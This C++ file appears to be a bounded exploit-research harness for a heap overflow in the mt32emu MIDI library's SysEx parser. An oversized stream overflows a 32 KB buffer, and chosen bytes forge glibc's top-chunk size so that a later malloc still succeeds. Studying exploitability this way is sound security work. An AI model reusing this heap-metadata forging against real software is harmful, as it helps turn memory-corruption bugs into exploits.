// W179 bounded experiment: can chosen attack bytes forge the real top-chunk
// size so the overflowed process survives and a later real malloc succeeds?
// Uses the pinned real library, real allocator and real Synth/parser. The
// malloc neighbour is harness-created, not an upstream object: rung 4 only.
#include <cstdarg>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>

#include "mt32emu.h"
#include "c_interface/c_interface.h"

using namespace MT32Emu;

static unsigned char *g_buf = NULL;
static size_t g_grows = 0;

void *operator new[](size_t n) {
	void *p = malloc(n);
	if (n == 32768 && g_buf == NULL) {
		++g_grows;
		g_buf = static_cast<unsigned char *>(p);
	}
	return p;
}
void operator delete[](void *p) throw() { free(p); }
void operator delete[](void *p, size_t) throw() { free(p); }

static void emit(const char *fmt, ...) {
	char line[512];
	va_list ap;
	va_start(ap, fmt);
	int n = vsnprintf(line, sizeof line, fmt, ap);
	va_end(ap);
	if (n > 0) {
		if ((size_t)n > sizeof line) n = sizeof line;
		ssize_t ignored = write(1, line, (size_t)n);
		(void)ignored;
	}
}

static void dump_header(const char *label) {
	if (!g_buf) return;
	char hex[25];
	for (size_t i = 0; i < 12; ++i) snprintf(hex + 2 * i, 3, "%02x", g_buf[32768 + i]);
	hex[24] = 0;
	emit("%s=%s\n", label, hex);
}

static void fill(Bit8u *buf, Bit32u len, bool shape, unsigned long long value) {
	memset(buf, 0x5a, len);
	buf[0] = 0xF0;
	if (shape)
		for (size_t i = 0; i < 8; ++i) buf[32776 + i] = (Bit8u)(value >> (8 * i));
}

static void report(const char *mode, void *next) {
	emit("mode=%s grows=%zu buf=%p next=%p delta=%ld\n",
		mode, g_grows, (void *)g_buf, next,
		g_buf && next ? (long)((unsigned char *)next - g_buf) : -1L);
}

int main(int argc, char **argv) {
	const char *mode = argc > 1 ? argv[1] : "shape";
	const bool shape = 0 == strcmp(mode, "shape");
	const bool safe = 0 == strcmp(mode, "safe");
	const Bit32u len = safe ? 102u : 40001u;
	Bit8u *stream = new Bit8u[len];
	// 0x10001: plausible glibc top-chunk size (65537, PREV_INUSE), all bytes
	// <= 0x7f so the SysEx scanner accepts them.
	fill(stream, len, shape, 0x10001ULL);
	if (safe) stream[len - 1] = 0xF7;
	Synth synth;
	DefaultMidiStreamParser parser(synth);
	parser.parseStream(stream, len);
	dump_header("pre_malloc_header");
	void *next = malloc(32);
	report(mode, next);
	dump_header("post_malloc_header");
	return 0; // leave allocations live: no frees after forged metadata
}
